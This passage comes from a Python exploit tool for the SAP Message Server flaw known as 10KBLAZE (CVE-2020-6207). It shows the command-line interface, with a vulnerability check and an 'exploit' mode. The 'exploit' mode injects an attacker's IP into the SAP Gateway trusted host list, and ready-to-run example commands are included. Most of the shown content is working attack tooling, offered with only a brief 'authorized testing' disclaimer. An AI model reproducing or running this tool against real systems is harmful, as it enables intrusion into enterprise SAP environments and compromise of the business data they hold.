        "session_key":   "",
        "ms_name":       "",
        "error":         "",
    }

    acc = check_ms_accessible(host, port, timeout)
    result["accessible"] = acc["accessible"]
    if not acc["accessible"]:
        result["error"] = acc["error"]
        return result

    acl = check_ms_acl(host, port, timeout)
    result["vulnerable"]    = acl["vulnerable"]
    result["acl_protected"] = acl.get("acl_protected", False)
    result["session_key"]   = acl["session_key"]
    result["ms_name"]       = acl["ms_name"]
    result["error"]         = acl["error"]
    return result


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "SAP Message Server betrusted exploit (10KBLAZE / CVE-2020-6207)\n"
            "Injects attacker IP into SAP Gateway trusted host list via MS registration.\n"
            "For authorized security testing only."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Check MS ACL:
    %(prog)s check-acl -t 10.0.1.5 -n 0

  Run betrusted attack (inject attacker IP):
    %(prog)s exploit -t 10.0.1.5 -n 0 -a 1.2.3.4

  Old kernel (720), no NILIST wait:
    %(prog)s exploit -t 10.0.1.5 -n 1 -a 1.2.3.4 --dp-version 11 --old-kernel --nilist-wait 0
""",
    )
    sub = parser.add_subparsers(dest="command", required=True)

    # ---- check-acl ---------------------------------------------------------
    p_check = sub.add_parser("check-acl",
                              help="Check if MS internal port lacks ACL (CVE-2020-6207)")
    p_check.add_argument("-t", "--target", required=True,
                         metavar="HOST", help="MS host (IP or hostname)")
    p_check.add_argument("-p", "--port", type=int, default=0,
                         help="MS internal port (default: auto from --instance)")
    p_check.add_argument("-n", "--instance", type=int, default=0,
                         metavar="NN", help="SAP instance number 0-99 (default: 0)")
    p_check.add_argument("--timeout", type=float, default=10.0)

    # ---- exploit -----------------------------------------------------------
    p_ex = sub.add_parser("exploit",
                           help="Execute betrusted attack to gain gateway trust")
    p_ex.add_argument("-t", "--target", required=True,
                      metavar="HOST", help="MS host (IP or hostname)")
    p_ex.add_argument("-p", "--port", type=int, default=0,
                      help="MS internal port (default: auto from --instance)")
    p_ex.add_argument("-n", "--instance", type=int, default=0,
                      metavar="NN", help="SAP instance number 0-99 (default: 0)")
    p_ex.add_argument("-a", "--attacker-ip", required=True,
                      metavar="IP", help="Attacker IP to inject into gateway trust list")
    p_ex.add_argument("--our-name", default=DEFAULT_REG_NAME,
                      help=f"Server name to register as (default: {DEFAULT_REG_NAME})")
    p_ex.add_argument("--diag-port", type=int, default=DEFAULT_DIAG_PORT,
                      help=f"SAPGUI diag port to advertise (default: {DEFAULT_DIAG_PORT})")
    p_ex.add_argument("--dp-version", type=int, default=DP_VERSION_V13,
                      choices=[11, 13, 14],
                      help="DP info version: 11=kernel~720, 13=kernel~745 (default), 14=kernel749+")
    p_ex.add_argument("--old-kernel", action="store_true",
                      help="Use old NILIST record format for kernel ~720")
    p_ex.add_argument("--nilist-wait", type=float, default=60.0,
                      metavar="SECS",
                      help="Seconds to wait for NILIST request from MS (0=skip, default: 60)")
    p_ex.add_argument("--timeout", type=float, default=10.0)
    p_ex.add_argument("-v", "--verbose", action="store_true",
                      help="Print debug output")

    return parser


def main() -> None:
    args = _build_parser().parse_args()
    port = args.port or ms_port(args.instance)

    if args.command == "check-acl":
        print(f"[*] Checking MS internal port {port} on {args.target}")
        acc = check_ms_accessible(args.target, port, args.timeout)
        if not acc["accessible"]:
            print(f"[-] Not reachable: {acc['error']}")
            sys.exit(1)
        print(f"[+] Port {port} is accessible")

        result = check_ms_acl(args.target, port, args.timeout)
        if result["vulnerable"]:
            print(f"[+] VULNERABLE: MS lacks ACL protection (CVE-2020-6207)")
            print(f"    MS server name : {result['ms_name']!r}")
            print(f"    Session key    : {result['session_key']}")
        elif result.get("acl_protected"):
            print(f"[~] ACL PROTECTED: Port accessible but MS blocks this IP")
            print(f"    errorno        : {result['errorno']}")
            print(f"    betrusted requires a whitelisted IP (SAP host, SAPRouter, etc.)")
        else:
            print(f"[-] NOT accessible: {result['error']}")
        sys.exit(0 if result["vulnerable"] else 1)

    elif args.command == "exploit":
        result = betrusted(
            host=args.target,
            port=port,
            attacker_ip=args.attacker_ip,
            instance_nr=args.instance,
            our_name=args.our_name,
            diag_port=args.diag_port,
            timeout=args.timeout,
            nilist_wait=args.nilist_wait,
            dp_version=args.dp_version,
            kernel_new=not args.old_kernel,
            verbose=args.verbose,
        )
        sys.exit(0 if result["success"] else 1)


if __name__ == "__main__":
    main()
